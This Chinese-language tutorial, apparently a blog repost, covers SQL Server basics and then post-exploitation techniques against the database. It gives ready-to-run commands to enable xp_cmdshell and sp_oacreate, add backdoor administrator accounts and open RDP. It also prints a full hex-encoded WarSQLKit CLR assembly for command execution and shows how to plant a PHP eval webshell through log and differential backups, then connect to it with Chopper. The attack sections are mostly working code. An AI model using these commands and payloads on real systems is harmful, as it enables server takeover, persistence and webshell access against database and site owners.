**目录**

[SQLServer数据库](#t0)

[修改默认1433端口](#t1)

[SQLServer数据库的管理](#t2)

[SQLServer数据库的查询语句](#t3)

[SA权限开启xp\_cmdshell获取主机权限](#t4)

[SA权限使用sp\_oacreate执行系统命令](#t5)

[SA权限使用CLR执行系统命令](#t6)

[DB\_owner权限LOG备份Getshell](#t7)

[DB\_owner权限差异备份Getshell](#t8)

[盲注SQLServer数据库](#t9)

[延时注入](#t10) 

[Union联合查询](#t11) 

[堆叠注入](#t12)

[SQLServer获取权限的奇淫技巧](#t13)

[还原备份数据库](#t14)

* * *

> 文章首发于安全客：[https://www.anquanke.com/post/id/200154](https://www.anquanke.com/post/id/200154)

![](https://img-blog.csdnimg.cn/20200302231103369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

SQLServer数据库
------------

**SQL Server**数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 **1433**。数据库后缀名 .mdf，注释符是 -- 。延时命令：WAITFOR  DELAY  '0:0:2'

**SQLServer有三个权限级别：**

*   sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限
*   db权限：文件管理，数据库操作等权限 users-administrators
*   public权限：数据库操作 guest-users

**判断当前用户权限**

```
判断是否是SA权限      
select is_srvrolemember('sysadmin')           
判断是否是db_owner权限        
select is_member('db_owner')      
判断是否是public权限      
select is_srvrolemember('public')
```


![](https://img-blog.csdnimg.cn/20200105114756704.png)

SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb 、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。

*   master数据库：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。
*   model数据库：model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。
*   msdb数据库：msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。
*   tempdb数据库：tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。

![](https://img-blog.csdnimg.cn/20190831102501807.png)

![](https://img-blog.csdnimg.cn/20190831102712267.png)

但是如果用navicat远程连接的话，只会显示2个实例数据库：ReportServer、ReportServerTempDB

![](https://img-blog.csdnimg.cn/20190831132020111.png)

### **修改默认1433端口**

打开SQLServer配置管理器——>SQLServer网络配置——>MSSQLSERVER的协议——>TCP/IP，右键属性

![](https://img-blog.csdnimg.cn/20200101212121519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200101212209396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200101212230555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### SQLServer数据库的管理

![](https://img-blog.csdnimg.cn/20200101212616424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

服务器名称：主机,端口

**Windows身份验证管理**

![](https://img-blog.csdnimg.cn/20200101212640144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**SQLServer身份验证管理**

![](https://img-blog.csdnimg.cn/20200101212711560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### SQLServer数据库的查询语句

```
select @@version;       #查询数据库的版本      
select @@servername;    #查询服务名      
select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字      
select db_name();       #查询当前数据库名      
select db_name(1);      #查询第一个数据库名      
select db_name(2);      #查询第二个数据库名      
select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner       
use tempdb              #切换到tempdb表        
top n                   #查询前n条记录      1
limit 2,3               #查询第2条开始的3条数据，也就是2,3,4      1
select substring('string',2,1)     #截取给定字符串的索引为2的1个字符      1
select ascii('a')                  #查询给定字符串的ascii值      1
select len('string')               #查询给定字符串的长度      1
EXEC sp_spaceused @updateusage = N'TRUE';  #查询当前数据库的大小      1
sp_spaceused '表名'                #查询指定表名的大小      1
EXEC master.sys.xp_dirtree '\\192.168.106.5\xx.txt',0,1;       1
判断是否是SA权限      1
select is_srvrolemember('sysadmin')           2
判断是否是db_owner权限        2
select is_member('db_owner')      2
判断是否是public权限      2
select is_srvrolemember('public')       2
#数据库的连接      2
server=127.0.0.1;UID=sa;PWD=123456;database=master;Provider=SQLOLEDB      2
mssql://sa:123456@127.0.0.1/XCCMS_SocialBusinessDB       2
count(name)是查询总数      3
name是查询名字      3
*是查询详细信息       3
#查询数据库      3
select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令      3
select name  from sysdatabases           #查询数据库的名字      3
select * from sysdatabases               #查询所有数据库的信息       3
#查询数据表      3
select count(name) from sysobjects where type='U' #查询当前数据库中表的个数      4
select name from sysobjects where type='U'  #查询当前数据库中所有表的名字      4
select * from sysobjects where type='U'    #查询当前数据库的所有表的详细信息       4
select count(name) from test..sysobjects where xtype='U'  #查询指定test数据库中表的个数      4
select name from test..sysobjects where xtype='U'         #查询指定test数据库中表的名字      4
select * from test..sysobjects where xtype='U'            #查询指定test数据库中表的详细信息       4
#查询列      4
select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')            #查询当前数据库的指定users表的列的个数      4
select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')         #查询当前数据库的指定users表的所有列的名字      5
select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')      #查询当前数据库的指定users表的列的详细信息       5
select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')     #查询指定test数据库的指定users表的列的个数      5
select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')       #查询指定test数据库的指定users表的所有列的名字      5
select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users')       #查询指定test数据库的指定users表的列的详细信息       5
#查询数据      5
select count(*) from test..users          #查询test数据库user表的数据的条数      5
select * from test..users                 #查询test数据库user表的所有数据
```


**查询当前数据库中所有表的大小**

```
declare  @table_spaceused table      
(name   nvarchar(100)      
,rows   int      
,reserved   nvarchar(100)      
,data   nvarchar(100)      
,index_size nvarchar(100)      
,unused nvarchar(100)      
)       1
insert into @table_spaceused      1
(name,rows,reserved,data,index_size,unused )      1
exec sp_MSforeachtable      1
@command1='exec sp_spaceused ''?'''       1
select * from @table_spaceused
```


SA权限开启xp\_cmdshell获取主机权限
------------------------

判断 xp\_cmdshell 是否打开，1就是打开了，0就是关闭了

```
select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell'
```


![](https://img-blog.csdnimg.cn/20200302210019221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果xp\_cmdshell权限没开启的话，我们可以执行下面命令开启，下面四步，使xp\_cmdshell开启

```
execute('sp_configure "show advanced options",1')  #将该选项的值设置为1      
execute('reconfigure')                             #保存设置      
execute('sp_configure "xp_cmdshell", 1')           #将xp_cmdshell的值设置为1      
execute('reconfigure')                             #保存设置      
execute('sp_configure')                            #查看配置      
execute('xp_cmdshell "whoami"')                    #执行系统命令       
或者      
exec sp_configure 'show advanced options',1;             1
reconfigure;                                             1
exec sp_configure 'xp_cmdshell',1;                       1
reconfigure;                                            1
exec sp_configure;                                       1
exec xp_cmdshell 'whoami';                                1
可以执行系统权限之后,前提是获取的主机权限是administrators组里的      1
exec xp_cmdshell 'net user Guest 123456'              #给guest用户设置密码      1
exec xp_cmdshell 'net user Guest /active:yes'         #激活guest用户      2
exec xp_cmdshell 'net localgroup administrators Guest /add'  #将guest用户添加到administrators用户组      2
exec xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'        #开启3389端口
```


![](https://img-blog.csdnimg.cn/20190831104530621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190831105323514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

SA权限使用sp\_oacreate执行系统命令
------------------------

使用sp\_oacreate提权前提条件：

*   SQLServer数据库服务未降权 （因为需要调用COM组件）
    

我们可以借助SQLServer中的COM组件SP\_OACREATE来执行系统命令，使用下面命令查看是否可使用 sp\_oacreate 执行系统命令

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'whoami'
```


![](https://img-blog.csdnimg.cn/20200101222608973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果SQLServer 阻止了对组件 'Ole Automation Procedures' 的过程  'sys.sp\_OACreate'  的访问，可以使用以下命令打开。

```
EXEC sp_configure 'show advanced options', 1;        
RECONFIGURE WITH OVERRIDE;        
EXEC sp_configure 'Ole Automation Procedures', 1;        
RECONFIGURE WITH OVERRIDE;
```


![](https://img-blog.csdnimg.cn/20200101222925474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

再次执行命令，发现不报错。此时可以执行系统命令了，但是使用 sp\_oacreate 执行系统命令不回显

![](https://img-blog.csdnimg.cn/20200101223036412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

于是我们可以使用以下命令创建用户hack。

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user hack Password@ /add'
```


![](https://img-blog.csdnimg.cn/2020010122313285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200101223139396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

SA权限使用CLR执行系统命令
---------------

```
#启用MSSQL CLR功能      
exec sp_configure 'show advanced options', 1;      
RECONFIGURE;      
Exec sp_configure 'clr enabled', 1;      
RECONFIGURE;       
#为了导入了不安全的程序集，我们还需要将数据库标记为安全。      
ALTER DATABASE [master] SET TRUSTWORTHY ON;       1
#导入程序集，单独执行      1
CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;      1
#创建存储过程,单独执行      1
CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;      1
#执行命令      1
EXEC sp_cmdExec 'whoami';      1
#删除该程序集      1
DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];
```


DB\_owner权限LOG备份Getshell
------------------------

无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马

**SQLServer常见的备份策略：**

*   每周一次完整备份
*   每天一次差异备份
*   每小时一次事务日志备份

**利用前提**：

*   目标机器存在数据库备份文件 ，也就是如果我们利用 test 数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是 完整模式
*   知道网站的绝对路径
*   该注入支持堆叠注入

```
alter database 数据库名 set RECOVERY FULL;   #修改数据库恢复模式为 完整模式      
create table cmd (a image);        #创建一张表cmd，只有一个列 a，类型为image      
backup log 数据库名 to disk= 'C:\phpstudy\WWW\1.php' with init;   #备份表到指定路径      
insert into cmd (a) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e);  #插入一句话到cmd表里      
backup log 数据库名 to disk='C:\phpstudy\WWW\2.php';   #把操作日志备份到指定文件      
drop table cmd;    #删除cmd表
```


 第四行的 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马 <?php @eval($\_POST\[x\]);?> 的16进制表示

![](https://img-blog.csdnimg.cn/20200303174954162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303175022797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303175048703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303175128291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303175156731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303175220629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

会在目标网站根目录下生成1.php和2.php文件，其中1.php 保存数据库，2.php就是我们需要连接的木马文件。

![](https://img-blog.csdnimg.cn/20200303175340259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

用菜刀连接即可

![](https://img-blog.csdnimg.cn/20200303173309681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

DB\_owner权限差异备份Getshell
-----------------------

注：差异备份有概率会把网站搞崩，所以不建议使用差异备份

**利用前提**：

*   知道网站的绝对路径  C:\\phpstudy\\WWW\\
*   该注入支持堆叠注入

注：以下语句一条一条执行

```
create table [dbo].[test] ([cmd] [image])      
declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x786965 backup log @a to disk = @s with init,no_truncate      
insert into [test](cmd) values(0x3c3f70687020406576616c28245f504f53545b785d293b3f3e)      
declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000 backup log @a to disk=@s with init,no_truncate      
Drop table [test]
```


*   这里第二行的 0x786965，是字符 xie 的16进制表示，这里随便填都可以
*   第三行的 0x3c3f70687020406576616c28245f504f53545b785d293b3f3e 是一句话木马 <?php @eval($\_POST\[x\]);?> 的16进制表示
*   第四行的0x43003A005C00700068007000730074007500640079005C005700570057005C007300680065006C006C002E00700068007000是  C:\\phpstudy\\WWW\\shell.php 的16进制表示

![](https://img-blog.csdnimg.cn/20200303172028173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303172123676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303172151237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303172224206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303172255617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200303172317293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后会在目标网站根目录下生成shell.php木马文件

![](https://img-blog.csdnimg.cn/202003031731186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

用菜刀连接即可

![](https://img-blog.csdnimg.cn/20200303173138710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

盲注SQLServer数据库
--------------

**判断是否是SQLServer数据库**

SQLServer数据库特有的表是：**sysobjects**  ，所以可以用它来判断是否是SQLServer数据库

```
exists(select*from sysobjects)
```


![](https://img-blog.csdnimg.cn/20200302165332176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200302165205815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

